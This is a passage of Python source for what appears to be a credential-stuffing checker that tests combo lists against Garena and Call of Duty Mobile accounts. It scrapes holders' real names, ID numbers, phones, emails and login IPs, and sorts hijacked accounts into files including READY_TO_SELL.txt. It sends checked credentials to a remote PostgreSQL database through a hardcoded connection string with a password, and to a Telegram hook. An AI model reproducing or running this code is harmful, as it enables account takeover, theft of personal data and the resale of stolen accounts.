        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)


def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound',
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive',
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        'facebook': {
            'fb_username': fb_username,
            'fb_uid': fb_uid
        },
        'binds': [],
        'game_info': []
    }
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info


import time
from datetime import datetime, timezone

def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    """Display CODM account information in a box"""
    if details is None:
        if error_reason is None:
            error_reason = 'Incorrect Password'
        print(f"[ INVALID ] {account} | {error_reason}")
        return
    
    username = details.get('username', 'N/A')
    is_clean = details.get('is_clean', False)
    
    if has_codm and codm_info:
        lvl = codm_info.get('codm_level', 'N/A')
        status = 'CLEAN' if is_clean else 'NOT CLEAN'
        
        # Display simple format
        print(f"[ VALID ] {username} | Level {lvl} | {status}")
        
    else:
        print(f"[ NO CODM ] {username} | No CODM Account")

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    """Display CODM account information with full details using format_hit"""
    if details is None:
        if error_reason is None:
            error_reason = 'Incorrect Password'
        print(f"[ INVALID ] {account} | {error_reason}")
        return
    
    username = details.get('username', 'N/A')
    is_clean = details.get('is_clean', False)
    
    if has_codm and codm_info:
        lvl = codm_info.get('codm_level', 'N/A')
        status = 'CLEAN' if is_clean else 'NOT CLEAN'
        
        # Extract data for format_hit
        shell = details['profile'].get('shell_balance', 0)
        region = codm_info.get('region', 'N/A')
        nickname = codm_info.get('codm_nickname', 'N/A')
        uid = codm_info.get('uid', 'N/A')
        mobile = details['personal'].get('mobile_no', 'N/A')
        email = details.get('email', 'N/A')
        email_ver = details.get('email_verified', False)
        two_step = details.get('two_step_verified', False)
        auth_app = details.get('authenticator_app', 'N/A')
        country = details.get('country', 'N/A')
        
        # Get last login
        login_history = details.get('login_history', [])
        last_login_info = login_history[0] if login_history else {}
        last_login = last_login_info.get('timestamp', 0)
        last_login_date = time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(last_login)) if last_login else 'Unknown'
        last_login_ip = last_login_info.get('ip', 'Unknown')
        
        # Facebook info
        fb_uid = details['facebook']['fb_uid']
        fb_username = details['facebook']['fb_username']
        if fb_uid != 'N/A' and fb_uid:
            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}'
            fb_info = 'CONNECTED' if fb_username and fb_username != 'N/A' else 'UNBIND or DELETED'
        else:
            fb_link = 'N/A'
            fb_info = 'NOT CONNECTED'
        
        # Connected games
        connected_games = []
        for g in game_connections or []:
            if g.get('game', '').upper() != 'CODM':
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                connected_games.append(f"{gname} [{greg}] {grole}" if greg else f"{gname} {grole}")
        
        # Display with format_hit
        print(format_hit(
            username=username,
            password=password,
            shell=shell,
            level=lvl,
            region=region,
            nickname=nickname,
            uid=uid,
            mobile=mobile,
            email=email,
            email_ver=email_ver,
            two_step=two_step,
            auth_app=auth_app,
            country=country,
            last_login=last_login_date,
            is_clean=is_clean,
            fb_link=fb_link,
            fb_info=fb_info,
            last_login_ip=last_login_ip,
            has_codm=True,
            connected_games=connected_games,
            status=status
        ))
        
    else:
        print(f"[ NO CODM ] {username} | No CODM Account")

def get_flag(code):
    """Get flag emoji from country code"""
    try:
        return "".join(chr(ord(c) + 127397) for c in str(code).upper())
    except:
        return ""

def format_hit(
    username, password, shell, level, region, nickname, uid,
    mobile, email, email_ver, two_step, auth_app,
    country, last_login, is_clean,
    fb_link="N/A", fb_info="NOT CONNECTED",
    last_login_ip="Unknown", has_codm=True,
    connected_games=None, colorized=False, status="CLEAN"
):
    """Format account hit information"""
    
    if connected_games is None:
        connected_games = []

    active_status = "UNKNOWN"
    if last_login != "Unknown":
        try:
            ll_str = last_login.replace(" UTC", "")
            ll_date = datetime.strptime(ll_str, "%Y-%m-%d %H:%M:%S")
            days_ago = (datetime.now(timezone.utc) - ll_date).days
            active_status = "ACTIVE" if days_ago <= 3 else "INACTIVE"
        except:
            pass

    clean_text = "CLEAN" if is_clean else "NOT CLEAN"
    
    if isinstance(email_ver, bool):
        email_verified = "yes" if email_ver else "no"
    else:
        email_verified = str(email_ver).lower()

    email_disp = (
        f"{email} [verified]"
        if email_verified == "yes"
        else f"{email} [not verified]"
    )

    fb_disp = "CONNECTED" if fb_info == "CONNECTED" else "NOT CONNECTED"

    c_flag = get_flag(country) if country and country != "N/A" else ""
    r_flag = get_flag(region) if region and region != "N/A" else ""

    cg_text = "\n".join(connected_games) if connected_games else "NONE"

    block = f"""
[ VALID ] {username} | Level {level} | {status}

{username}:{password}

Clean: {clean_text}
{"CODM: NO ACCOUNT FOUND" if not has_codm else ""}
Status: VALID

---
Player Info =>
    UID: {uid}
    Nickname: {nickname}
    Level: {level}
    Shell Balance: {shell}
    Region: {region} {r_flag}
    Country: {country} {c_flag}
    Email: {email_disp}
    Phone: {mobile}
    Last Login: {last_login}
    Last Login IP: {last_login_ip}
    Active Status: {active_status}

Bindings:
    Mobile Bound: {"Yes" if mobile not in ["", "N/A", None] else "No"}
    Email Verified: {"Yes" if email_verified == "yes" else "No"}
    Facebook Linked: {fb_disp}
    Authenticator: {auth_app}
    2FA Enabled: {two_step}

Connected Games:
{cg_text}

Powered by @LEGIThea
----------------------------------------------
"""

    return block.strip()

def save_clean_or_notclean(is_clean, shell, result_folder, formatted_text, codm_info=None, account=None, password=None, country=None, live_stats=None):
    """Save account result to appropriate files"""
    try:
        os.makedirs(result_folder, exist_ok=True)
        plain_text = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', formatted_text)
        
        with FILE_LOCK:
            if codm_info:
                file_path = os.path.join(result_folder, 'CLEAN.txt') if is_clean else os.path.join(result_folder, 'NOT_CLEAN.txt')
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
            else:
                file_path = os.path.join(result_folder, 'NO_CODM.txt')
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")

            try:
                shell_val = int(float(str(shell).strip()))
                if shell_val > 0:
                    shells_folder = os.path.join(result_folder, 'SHELLS')
                    os.makedirs(shells_folder, exist_ok=True)
                    
                    if shell_val <= 99:
                        shell_file = '1-99.txt'
                    elif shell_val <= 199:
                        shell_file = '100-199.txt'
                    elif shell_val <= 299:
                        shell_file = '200-299.txt'
                    elif shell_val <= 399:
                        shell_file = '300-399.txt'
                    elif shell_val <= 499:
                        shell_file = '400-499.txt'
                    else:
                        shell_file = '500+.txt'
                    
                    with open(os.path.join(shells_folder, shell_file), "a", encoding="utf-8") as sf:
                        sf.write(plain_text + "\n ________________________ \n\n")
            except:
                pass

            if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
                try:
                    codm_level = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    codm_level = 0
                
                region = codm_info.get('region', 'N/A').upper()
                country_code = country.upper() if country and country != 'N/A' else region
                if country_code == 'N/A' or not country_code or country_code == 'NONE':
                    country_code = region if region and region != 'N/A' else 'UNKNOWN'
                
                if codm_level <= 49:
                    level_range = "1-49"
                elif codm_level <= 99:
                    level_range = "50-99"
                elif codm_level <= 199:
                    level_range = "100-199"
                elif codm_level <= 299:
                    level_range = "200-299"
                else:
                    level_range = "300-400"
                
                folder_path = os.path.join(result_folder, "COUNTRY", country_code)
                os.makedirs(folder_path, exist_ok=True)
                with open(os.path.join(folder_path, f"{level_range}.txt"), "a", encoding="utf-8") as f:
                    f.write(plain_text + "\n ________________________ \n\n")
                
                if 90 <= codm_level <= 400 and account and password:
                    status_str = "clean" if is_clean else "notclean"
                    ign = codm_info.get('codm_nickname', 'N/A')
                    uid = codm_info.get('uid', 'N/A')
                    sell_line = f"{account}:{password} | shells: {shell} | level: {codm_level} | ign: {ign} | uid: {uid} | country: {country_code} | status: {status_str}\n"
                    
                    sell_path = os.path.join(result_folder, "READY_TO_SELL.txt")
                    with open(sell_path, "a", encoding="utf-8") as sf:
                        sf.write(sell_line)

            if live_stats and codm_info:
                try:
                    c_lvl = int(float(str(codm_info.get('codm_level', 0))))
                except:
                    c_lvl = 0
                
                live_stats.add_hit(c_lvl, plain_text)
                
                with live_stats.lock:
                    sorted_desc = sorted(live_stats.valid_hits, key=lambda x: x['level'], reverse=True)
                
                with open(os.path.join(result_folder, 'HIGH_TO_LOW.txt'), 'w', encoding='utf-8') as f:
                    for hit in sorted_desc:
                        f.write(hit['text'] + "\n ________________________ \n\n")
    except:
        pass

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}
    game_mappings = {
        'tw': {'100082': 'CODM', '100067': 'FREE FIRE', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100105': 'GARENA UNDAWN', '100050': 'ROV', '100151': 'DELTA FORCE', '100147': 'FAST THRILL', '100107': 'MOONLIGHT BLADE'},
        'th': {'100067': 'FREEFIRE', '100055': 'ROV', '100082': 'CODM', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100130': 'BLACK CLOVER M', '100070': 'SPEED DRIFTERS', '32836': 'FC ONLINE', '100071': 'FC ONLINE M', '100124': 'MOONLIGHT BLADE'},
        'vn': {'32837': 'FC ONLINE', '100072': 'FC ONLINE M', '100054': 'ROV', '100137': 'THE WORLD OF WAR'},
        'default': {'100082': 'CODM', '100067': 'FREEFIRE', '100151': 'DELTA FORCE', '100105': 'GARENA UNDAWN', '100057': 'AOV', '100070': 'SPEED DRIFTERS', '100130': 'BLACK CLOVER M', '100055': 'ROV'}
    }
    try:
        token_url = 'https://authgop.garena.com/oauth/token/grant'
        token_data = f'client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}'
        token_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Pragma': 'no-cache', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            token_resp = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
            access_token = token_resp.json().get('access_token', '')
        except Exception:
            return []
        if not access_token:
            return []
        inspect_url = 'https://shop.garena.sg/api/auth/inspect_token'
        inspect_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*', 'Content-Type': 'application/json'}
        try:
            inspect_resp = session.post(inspect_url, headers=inspect_hdrs, json={'token': access_token}, timeout=15)
            inspect_json = inspect_resp.json()
        except Exception:
            return []
        session_key = inspect_resp.cookies.get('session_key')
        if not session_key:
            return []
        uac = inspect_json.get('uac', 'ph').lower()
        region = uac if uac in valid_regions else 'ph'
        if region in ('th', 'in'):
            base_domain = 'termgame.com'
        elif region == 'id':
            base_domain = 'kiosgamer.co.id'
        elif region == 'vn':
            base_domain = 'napthe.vn'
        else:
            base_domain = f'shop.garena.{region}'
        applicable = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable.items():
            roles_url = f'https://{base_domain}/api/shop/apps/roles'
            roles_hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': 'application/json, text/plain, */*', 'Referer': f'https://{base_domain}/?app={app_id}', 'Cookie': f'session_key={session_key}'}
            try:
                roles_resp = session.get(roles_url, params={'app_id': app_id}, headers=roles_hdrs, timeout=15)
                roles_data = roles_resp.json()
            except Exception:
                continue
            role = None
            if isinstance(roles_data.get('role'), list) and roles_data['role']:
                role = roles_data['role'][0]
            elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                candidate = roles_data[app_id][0]
                role = candidate.get('role') or candidate.get('user_id') if isinstance(candidate, dict) else str(candidate)
            elif isinstance(roles_data, list) and roles_data:
                first = roles_data[0]
                if isinstance(first, dict) and first.get('role'):
                    role = first['role']
            if role:
                game_info.append({'region': region.upper(), 'game': game_name, 'role': str(role)})
    except Exception as e:
        logger.error(f'[ERROR] get_game_connections failed: {e}')
    return game_info

def save_game_folder(account, password, account_data, game_connections, base_dir):
    try:
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)
        identifier = f'{account}:{password}'
        base_entry = f"{identifier}\nEmail: {account_data.get('email_display', 'N/A')}\nMobile: {account_data.get('formatted_mobile', 'N/A')}\nShell: {account_data.get('shell_balance', 0)}\nCountry: {account_data.get('country', 'N/A')}\nLast Login: {account_data.get('last_login_date', 'N/A')}\nLogin Location: {account_data.get('last_login_where', 'N/A')}\nLogin IP: {account_data.get('last_login_ip', 'N/A')}\nFB Status: {account_data.get('fb_info', 'N/A')}\nStatus: {('CLEAN' if account_data.get('is_clean') else 'NOT CLEAN')}\n"
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games:
                continue
            saved_games.add(gname)
            fname = GAME_FILE_MAP.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = games_dir / fname
            if gname == 'CODM':
                entry = base_entry + f'CODM IGN: {grole}\n' + f"CODM Level: {account_data.get('codm_level', 'N/A')}\n" + f"CODM UID: {account_data.get('codm_uid', 'N/A')}\n" + f'CODM Region: {gregion}\n'
            else:
                entry = base_entry + f'{gname} IGN: {grole}\n' + f'{gname} Region: {gregion}\n'
            already = False
            if fpath.exists():
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    if identifier in f.read():
                        already = True
            if not already:
                with open(fpath, 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry.strip() + '\n\n')
    except Exception as e:
        logger.error(f'[ERROR] save_game_folder: {e}')
        

class ResultsManager:
    def __init__(self, combo_file_path):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/output_{self.combo_file_name}')
        for sub in ('Country', 'Level', 'Games', 'Garena Shells'):
            (self.base_dir / sub).mkdir(parents=True, exist_ok=True)

        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()
        self._db_queue = []
        self._db_queue_lock = threading.Lock()
        self._db_flush_lock = threading.Lock()
        self._DB_BATCH = 100
        self._db_flushing = False

    def _db_enqueue(self, combo):
        with self._db_queue_lock:
            self._db_queue.append(combo)
            should_flush = (
                len(self._db_queue) >= self._DB_BATCH
                and not self._db_flushing
            )

        if should_flush:
            threading.Thread(
                target=self._db_flush_batch,
                daemon=True
            ).start()

    def _db_flush_batch(self, force=False):
        with self._db_flush_lock:
            with self._db_queue_lock:
                if not self._db_queue:
                    return

                if not force and len(self._db_queue) < self._DB_BATCH:
                    return

                batch = list(self._db_queue)
                self._db_queue.clear()
                self._db_flushing = True

            try:
                _pg_save_combos(batch)
            except Exception:
                pass
            finally:
                with self._db_queue_lock:
                    self._db_flushing = False

    def db_flush_final(self):
        self._db_flush_batch(force=True)

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        import re as _re

        m = _re.search(r'Level:\s*(\d+)', entry)
        return int(m.group(1)) if m else 0

    def _write_sorted(self, filepath, new_entry_body):
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)

        with self._get_flock(filepath):
            entries = []

            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                    content = f.read()

                raw_entries = content.strip().split('\n' + '=' * 60 + '\n')

                for raw_entry in raw_entries:
                    raw_entry = raw_entry.strip()

                    if raw_entry:
                        if raw_entry.startswith('=' * 60):
                            raw_entry = raw_entry[len('=' * 60):].strip()

                        if raw_entry.endswith('=' * 60):
                            raw_entry = raw_entry[:-len('=' * 60)].strip()

                        entries.append(raw_entry)

            new_entry = new_entry_body.strip()

            if new_entry.startswith('=' * 60):
                new_entry = new_entry[len('=' * 60):].strip()

            if new_entry.endswith('=' * 60):
                new_entry = new_entry[:-len('=' * 60)].strip()

            entries.append(new_entry)
            entries.sort(key=self._entry_level, reverse=True)

            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write('=' * 60 + '\n')
                    f.write(entry.strip())
                    f.write('\n' + '=' * 60)

                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join(c for c in str(val) if c >= ' ' or c in '\t').strip()
        return cleaned or 'N/A'

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')

        if account_data.get('is_error'):
            return (
                '=' * 60
                + f"\nAccount: {acct} : {pwd}\n"
                + f"Error: {account_data.get('error_reason', 'Unknown')}\n"
                + '=' * 60
            )

        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)

        _region_raw = account_data.get('codm_region', 'N/A')
        _region_info = (
            CODM_REGIONS.get(str(_region_raw).upper(), {})
            if _region_raw and _region_raw != 'N/A'
            else {}
        )

        if _region_info:
            _server_str = f"{_region_info['flag']} {_region_info['name']} ({_region_raw})"
        else:
            _server_str = str(_region_raw)

        lines = [
            f"{index}. {acct}:{pwd}",
            f"Clean: {'CLEAN' if is_clean else 'NOT CLEAN'}",
            f"{'CODM: NO ACCOUNT FOUND' if not has_codm else ''}",
            "Status: VALID",
            "",
            "---",
            "Player Info =>",
            f"    UID: {account_data.get('codm_uid', account_data.get('uid', 'N/A'))}",
            f"    Nickname: {self._ascii(account_data.get('codm_nickname', account_data.get('nickname', 'N/A')))}",
            f"    Level: {account_data.get('codm_level', 'N/A')}",
            f"    Shell Balance: {account_data.get('shell_balance', 0)}",
            f"    Region: {account_data.get('country', 'N/A')}",
            f"    Email: {account_data.get('email_display', 'N/A')}",
            f"    Phone: {account_data.get('formatted_mobile', 'N/A')}",
            f"    Server: {_server_str}",
            "",
            "    Bindings:",
            f"        Mobile Bound: {'Yes' if account_data.get('formatted_mobile') not in ['N/A', '', None] else 'No'}",
            f"        Email Verified: {'Yes' if account_data.get('email_verified', False) else 'No'}",
            f"        Facebook Linked: {'Yes' if account_data.get('fb_info') == 'CONNECTED' else 'No'}",
            f"        Authenticator: {'Yes' if account_data.get('auth_app') in ['Yes', True] else 'No'}",
            f"        2FA Enabled: {'Yes' if account_data.get('two_step') in ['Yes', True] else 'No'}",
            "",
            "Login Info =>",
            f"    Last Login: {account_data.get('last_login_date', 'N/A')}",
            f"    Last Login From: {account_data.get('last_login_where', 'N/A')}",
            f"    Last Login IP: {account_data.get('last_login_ip', 'N/A')}",
            f"    Last Login Country: {account_data.get('last_login_country', 'N/A')}",
            "",
            "Facebook =>",
            f"    Username: {self._ascii(account_data.get('fb_username', 'N/A'))}",
            f"    Link: {account_data.get('fb_link', 'N/A')}",
            f"    Status: {account_data.get('fb_info', 'N/A')}",
            "",
            "Powered by @LEGIThea"
        ]

        return "\n".join(line for line in lines if line)

    def add_account(self, account_data):
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        if combo.strip(':'):
            self._db_enqueue(combo)
        if _TG_HOOK and (not account_data.get('is_error')):
            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        index = self._next_index()
        entry = self._format_account(account_data, index=index)
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        valid_path = self.base_dir / 'Valid Accounts.txt'
        self._append_line(valid_path, combo)
        self._write_sorted(self.base_dir / 'All Accounts.txt', entry)
        clean_file = 'Clean Accounts.txt' if is_clean else 'Not Clean Accounts.txt'
        self._write_sorted(self.base_dir / clean_file, entry)
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country} Accounts.txt', entry)
        if has_codm:
            try:
                lvl = int(account_data.get('codm_level', 0) or 0)
            except (ValueError, TypeError):
                lvl = 0
            if lvl <= 100:
                bucket = '1-100.txt'
            elif lvl <= 200:
                bucket = '101-200.txt'
            elif lvl <= 350:
                bucket = '201-350.txt'
            else:
                bucket = '351-400.txt'
            self._write_sorted(self.base_dir / 'Level' / bucket, entry)
        if shell > 0:
            shells_file = 'CODM Accounts.txt' if has_codm else 'NO CODM Accounts.txt'
            self._write_sorted(self.base_dir / 'Garena Shells' / shells_file, entry)


def _pg_get_stats():
    import psycopg2
    conn = psycopg2.connect(RAILWAY_DB_URL)
    cur = conn.cursor()
    cur.execute('SELECT COUNT(*) FROM checked_accounts')
    total = cur.fetchone()[0]
    cur.execute('SELECT MAX(checked_at) FROM checked_accounts')
    latest = cur.fetchone()[0]
    cur.close()
    conn.close()
    return {'total': total or 0, 'latest': latest}

def _pg_save_combos(combos: list):
    import psycopg2
    import psycopg2.extras
    if not combos:
        return
    conn = psycopg2.connect(RAILWAY_DB_URL)
    cur = conn.cursor()
    psycopg2.extras.execute_values(cur, 'INSERT INTO checked_accounts (combo) VALUES %s ON CONFLICT (combo) DO NOTHING', [(c,) for c in combos])
    conn.commit()
    cur.close()
    conn.close()

def _pg_filter_combos(local_combos: list):
    import psycopg2
    conn = psycopg2.connect(RAILWAY_DB_URL)
    cur = conn.cursor()
    BATCH = 2000
    matched_set = set()
    for i in range(0, len(local_combos), BATCH):
        batch = local_combos[i:i + BATCH]
        cur.execute('SELECT combo FROM checked_accounts WHERE combo = ANY(%s)', (batch,))
        for row in cur.fetchall():
            matched_set.add(row[0])
    cur.close()
    conn.close()
    return matched_set
    
RAILWAY_DB_URL = "postgresql://postgres:WpvhxjxDCMnlIsUruKPZdXoAhyFNGBaK@sakura.proxy.rlwy.net:22135/railway"
import sqlite3

class DatabaseComparison:
    def __init__(self):
        self.remote_url = RAILWAY_DB_URL
        self.local_db = Path('leak_database.db')
        self._init_local_db()
        self._init_remote()
    
    def _init_local_db(self):
        conn = sqlite3.connect(self.local_db)
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS checked_accounts (
                combo TEXT PRIMARY KEY,
                checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
    
    def _init_remote(self):
        try:
            import psycopg2
            conn = psycopg2.connect(self.remote_url)
            cur = conn.cursor()
            cur.execute('''
                CREATE TABLE IF NOT EXISTS checked_accounts (
                    combo TEXT PRIMARY KEY,
                    checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            conn.commit()
            conn.close()
            self.remote_available = True
            _log('SUCCESS', 'Railway PostgreSQL connected')
        except Exception as e:
            self.remote_available = False
            _log('WARNING', f'Railway unavailable: {e}')
    
    def display_database_stats(self):
        indent = '    '
        
        if hasattr(self, 'remote_available') and self.remote_available:
            try:
                import psycopg2
                conn = psycopg2.connect(self.remote_url)
                cur = conn.cursor()
                cur.execute('SELECT COUNT(*) FROM checked_accounts')
                total = cur.fetchone()[0]
                cur.execute('SELECT MAX(checked_at) FROM checked_accounts')
                latest = cur.fetchone()[0]
                conn.close()
                
                print()
                _abox_open('RAILWAY DATABASE STATISTICS', bc=CYAN, tc=CYAN)
                _abox_row('Total Stored', f'{total:,}', vc=CYAN)
                _abox_row('Last Entry', latest.split('.')[0] if latest else 'N/A', vc=YELLOW)
                _abox_row('Host', 'Railway PostgreSQL', vc=MAGENTA)
                _abox_row('Status', 'Online', vc=GREEN)
                _abox_close(bc=CYAN)
                print()
                return
            except:
                pass
        
        if not self.local_db.exists():
            _log('INFO', 'No local database yet.', indent)
            return
        
        try:
            conn = sqlite3.connect(self.local_db)
            cur = conn.cursor()
            cur.execute('SELECT COUNT(*) FROM checked_accounts')
            total = cur.fetchone()[0]
            cur.execute('SELECT MAX(checked_at) FROM checked_accounts')
            latest = cur.fetchone()[0]
            conn.close()
            
            print()
            _abox_open('LOCAL DATABASE STATISTICS', bc=CYAN, tc=CYAN)
            _abox_row('Total Stored', f'{total:,}', vc=CYAN)
            _abox_row('Last Entry', latest.split('.')[0] if latest else 'N/A', vc=YELLOW)
            _abox_row('Type', 'SQLite Local', vc=MAGENTA)
            _abox_close(bc=CYAN)
            print()
        except Exception as e:
            _log('ERROR', f'Could not read local database: {e}', indent)
    
    def save_combo(self, combo):
        self._save_local(combo)
        if self.remote_available:
            try:
                self._save_remote(combo)
            except:
                pass
    
    def _save_remote(self, combo):
        import psycopg2
        conn = psycopg2.connect(self.remote_url)
        cur = conn.cursor()
        cur.execute('INSERT INTO checked_accounts (combo) VALUES (%s) ON CONFLICT (combo) DO NOTHING', (combo,))
        conn.commit()
        conn.close()
    
    def _save_local(self, combo):
        conn = sqlite3.connect(self.local_db)
        cur = conn.cursor()
        cur.execute('INSERT OR IGNORE INTO checked_accounts (combo) VALUES (?)', (combo,))
        conn.commit()
        conn.close()
    
    def check_single_leak(self, combo):
        if self.remote_available:
            try:
                return self._check_remote(combo)
            except:
                return self._check_local(combo)
        return self._check_local(combo)
    
    def _check_remote(self, combo):
        import psycopg2
